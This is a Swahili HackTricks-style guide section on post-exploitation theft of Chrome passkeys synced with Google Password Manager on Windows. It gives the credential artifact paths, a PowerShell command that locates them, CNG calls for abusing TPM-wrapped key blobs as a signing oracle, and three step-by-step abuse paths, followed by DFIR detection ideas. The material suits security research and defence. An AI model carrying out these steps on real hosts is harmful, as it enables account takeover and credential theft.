Ikiwa utekelezaji wa code utapatikana kama **mtumiaji mhanga** kwenye host ya Windows inayotumia **Chrome + passkeys zilizosawazishwa na Google Password Manager**, passkeys huwa lengo la kuvutia baada ya unyonyaji hata **bila admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Artifacts za ndani zinazovutia

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** huhifadhi rekodi za **`WebauthnCredentialSpecifics`** zilizosimbwa kwa protobuf. Mchakato unaoendeshwa na mtumiaji yuleyule unaweza kuorodhesha **RP ID**, **username**, **credential ID**, na nyenzo ya private key iliyosimbwa kwa njia fiche ya passkeys zilizosawazishwa.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** huhifadhi hali ya usajili wa kifaa cha ndani, kama vile **`wrapped_identity_private_key`** na siri iliyofungwa inayotumika kurejesha credentials zilizosawazishwa.<sup>[[4]](#references)</sup>

Ukaguzi wa haraka:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### Key blobs zilizofungwa kwa TPM bado zinaweza kutumiwa vibaya kama local signing oracle

Ikiwa kivinjari kitatoa identity key inayotegemea TPM kama **`NCRYPT_OPAQUE_KEY_BLOB`** na kuhifadhi blob hiyo katika hali inayoweza kufikiwa na mtumiaji, malware haihitaji kutoa private key ghafi. Inaweza tu kuingiza blob hiyo tena kwenye **mashine hiyo hiyo** na kuiomba TPM ya ndani isaini data inayodhibitiwa na mshambulizi:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

Hii ina maana kwamba **ufungamanishaji wa maunzi huzuia uhamishaji nje ya kifaa, lakini hauzuii matumizi na mtumiaji huyo huyo kwenye kifaa kilichoathiriwa**.

### Njia za vitendo za matumizi mabaya

1. **Pass-ta-key / relay ya utambulisho wa kifaa**<sup>[[4]](#references)</sup>
   - Orodhesha `WebauthnCredentialSpecifics` kutoka LevelDB ya Chrome.
   - Anzisha kuingia kwa passkey na upate changamoto mpya ya WebAuthn.
   - Tumia blob ya `wrapped_identity_private_key` iliyoibwa kwenye TPM ya mwathiriwa kutia sahihi binding ya ombi la cloud-authenticator.
   - Peleka assertion iliyorejeshwa kwa relying party.
   - Hii huwa na manufaa hasa RP inapokubali `userVerification=preferred` au ikishindwa kukataa assertions zenye **`UV=0`**.
2. **Utekaji wa ufunguo wa UV unaosubiri**<sup>[[4]](#references)</sup>
   - Lazimisha usanidi mpya kwa kufuta `passkey_enclave_state` au kutuma operesheni halali ya `device/forget` iliyotiwa sahihi.
   - Ikiwa usanidi mpya utaiacha kifaa katika hali ya **`uv_key_pending`**, sajili ufunguo wa umma wa UV unaodhibitiwa na mshambuliaji.
   - Ikiwa mtoa huduma hatahakiki attestation / asili ya maunzi salama ya ufunguo mpya wa UV, saini za baadaye kutoka kwa ufunguo wa mshambuliaji zitachukuliwa kuwa **`UV=1`**.
3. **Wizi wa urejeshaji wa siri kuu / SDS**<sup>[[4]](#references)</sup>
   - Lazimisha urejeshaji au kujiunga tena ili Chrome ipakue siri kuu ya passkey iliyosawazishwa.
   - Fuatilia uundaji upya/mabadiliko ya `passkey_enclave_state`, kisha tupa kumbukumbu ya Chrome wakati **siri ya kikoa cha usalama (SDS)** iliyo wazi ipo humo.
   - Tumia SDS iliyorejeshwa kusimbua sehemu zilizosimbwa katika kila rekodi ya `WebauthnCredentialSpecifics` na kurejesha funguo binafsi za WebAuthn zinazoweza kuhamishwa.

### Mawazo ya DFIR / ugunduzi

- Fuatilia **ufutaji/uundaji upya** wa `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Toa tahadhari kuhusu ufikiaji usio wa kawaida wa Chrome **`Sync Data\LevelDB`** kutoka kwa michakato isiyo ya kivinjari.
- Toa tahadhari kuhusu **tupio la kumbukumbu ya Chrome** au ufikiaji unaotiliwa shaka wa kumbukumbu kati ya michakato.
- Chunguza maombi yanayojirudia ya **PIN ya urejeshaji ya Google Password Manager** au usanidi mpya usiotarajiwa.
- Kumbuka kwamba WebAuthn **`signCount`** mara nyingi haifai kwa passkey zilizosawazishwa kwa sababu inaweza kubaki bila kubadilika, hivyo ugunduzi wa kawaida wa nakala zisizoidhinishwa huwa dhaifu.

## References

- [1] [Unit 42 – Uchunguzi wa Operesheni Zilizolenga Sekta Zenye Thamani Kubwa kwa Miaka Bila Kugunduliwa](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: Ulaghai wa Word VBA macro kupitia SMTP → usimbuaji wa credentials za hMailServer → Veeam CVE-2023-27532 hadi SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Ndani ya Ink Dragon: Kufichua Mtandao wa Relay na Jinsi Operesheni Fiche ya Kihujumu Inavyofanya Kazi](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: Eneo Jipya la Mashambulizi katika Uthibitishaji Usiohitaji Nenosiri](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / uhifadhi wa funguo wa CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Kudukua Windows: Mashambulizi dhidi ya Mifumo na Mitandao ya Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Jinsi Hifadhi ya Data ya Active Directory Inavyofanya Kazi: Ndani ya NTDS.dit (Sehemu ya 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Kutupa Nenosiri za Lsass kwa Mbali](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho Yaongeza Zana za Ujasusi Mtandaoni kwa Toolkit ya Still](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – Kazi ya CreateFileW na `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Hali ya chelezo ya Robocopy `/B`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Maswali Yanayoulizwa Mara kwa Mara ya Telegram – kusitisha vipindi vinavyotumika](https://telegram.org/faq)
- [14] [Microsoft Learn: Remote Credential Guard na Restricted Admin](https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)
- [15] [Microsoft Learn: Ulinzi na Usimamizi wa Credentials](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management)
- [16] [S12 DumpNTDS.cpp](https://github.com/S12cybersecurity/HandleRedirect/blob/main/DumpNTDS/DumpNTDS/DumpNTDS.cpp)
{{#include ../../banners/hacktricks-training.md}}
